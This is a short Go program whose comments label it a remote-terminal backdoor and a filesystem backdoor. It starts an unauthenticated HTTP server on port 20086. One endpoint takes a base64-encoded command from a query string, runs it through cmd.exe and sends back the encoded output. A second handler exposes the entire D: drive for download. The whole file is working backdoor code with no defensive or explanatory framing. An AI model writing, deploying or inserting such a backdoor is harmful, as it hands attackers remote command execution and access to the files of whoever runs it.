package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

func runShell(w http.ResponseWriter, req *http.Request) {
	fmt.Println("Get a new request")
	// get data
	shell := req.URL.Query().Get("shell")
	// encode data
	decodedShell, err := base64.StdEncoding.DecodeString(shell)
	if err != nil {
		result := map[string]interface{}{
			"code": http.StatusBadRequest,
			"msg":  "Failed to decode shell content",
			"data": "Failed to decode shell content",
		}
		json.NewEncoder(w).Encode(result)
		return
	}
	shell = string(decodedShell)
	// run shell
	cmd := exec.Command("cmd.exe", "/C", "chcp 65001 && "+shell)
	// process output
	output, err := cmd.CombinedOutput()
	if err != nil {
		result := map[string]interface{}{
			"code": http.StatusBadRequest,
			"msg":  "Failed to run the shell, server had a wrong",
			"data": err,
		}
		json.NewEncoder(w).Encode(result)
		return
	}
	outputStr := string(output)
	outputStrs := []byte(outputStr)
	outputStrBase64 := base64.StdEncoding.EncodeToString(outputStrs)
	result := map[string]interface{}{
		"code": http.StatusOK,
		"msg":  "Success",
		"data": outputStrBase64,
	}
	json.NewEncoder(w).Encode(result)
	return
}

func startServer() {
	// 远程终端执行后门
	http.HandleFunc("/run_shell", runShell)

	// 文件系统后门
	//p, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	http.Handle("/file/", http.FileServer(http.Dir("D:\\")))

	err := http.ListenAndServe(":20086", nil)
	if err != nil {
		os.Exit(0)
	}
}

func main() {
	startServer()
}
